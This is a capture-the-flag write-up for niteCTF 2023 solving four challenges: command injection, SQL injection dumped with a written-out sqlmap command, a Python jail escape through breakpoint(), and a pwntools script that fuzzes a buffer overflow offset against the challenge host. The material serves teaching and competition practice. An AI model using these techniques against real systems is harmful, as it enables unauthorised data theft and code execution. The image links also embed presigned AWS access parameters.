# nitectf - 2023

Homepage - https://nitectf.live/
CTF Page - https://play.nitectf.live/

## Web

### ERaaS

> Description
> Emergency response? Afraid not.
> http://eraas.web.nitectf.live/

Here there is command injection. Firstly, I tried to do `ls`, it printed all the files in current directory. There was a flag.txt file and then I printed content of flag.txt file using `cat`.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_5f4548808dc296f4542216885942f053.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702998416&Signature=ARr8EoQGyjnSCTFQRsYtyrLePCE%3D)

Flag: `nite{b3tt3r_n0_c5p_th7n_b7d_c5p_r16ht_fh8w4d}`

### LiteLibrary

> Description
> Testing in prod. No worries are long as we are lighte :)
> http://litelibrary.web.nitectf.live/

In website, there is a search functionality `http://litelibrary.web.nitectf.live/api/search?q=ab` here `q` is the query. So as that data is coming from database, I have tried to do SQL injection and it worked.

Using sqlmap, we can dump all the data and get the flag.

`python sqlmap.py -u http://litelibrary.web.nitectf.live/api/search?q=ab --level 2 --risk 2`

The flag is in user's table.

Flag: `nite{t00_l1t3_huh_50m30n3_g37_an71_g2av17y_0v3r_h3r3}`

## Misc

### blindjail

Here, from the question title itself, we can get to know that it is python jail breaking challenge. So I have tried to imort os first, it was showing no imports are allowed. Other commands are getting banned like system. Also builtins are not defined... After some tries, I found out that we can use `breakpoint()` and then we can import os and run system command in the command line.

![image](https://github.com/krishnan-tech/ctf-writeups/assets/55576296/2c066999-4295-4813-8d9f-acd71b282589)

Flag: `nitectf{sl1d3_0ver_th3se_4ttribut3s}`

## Pwn

### The road not taken

> Show me the right path to reach my final destination
> nc 34.100.142.216 1337

There was a binary attached with this challenge, when I loaded binary in ghidra,

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_227bfaca512bbda62dd321610228f97c.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1702998444&Signature=n4zlA%2FBqBoxMKJzXrI%2FHC2FNlgw%3D)

I can see, `local_10` variable is getting executed. So basically it is buffer overflow challenge, we just have to find the right offset and write the addredd as 'Y'. Offset to `right_direction` function.

So, in `main()` function, `local_218` function is of length 520.

So I wrote a script to fuzz and finally, I found

```python
from pwn import *

host = '34.100.142.216'
port = 1337


for offset in range(520, 600):
    conn = remote(host, port)

    payload = b'Y' * offset

    conn.send(payload)
    print(conn.recvline())
    print(conn.recvline())

    try:
        last_line = conn.recvline()

        if b'nite' in last_line:
            print(offset, last_line)
            break
    except:
        pass

    conn.close()
```

Flag: `nite{R0b3rT_fro5t_ftw_32dx5hp}`
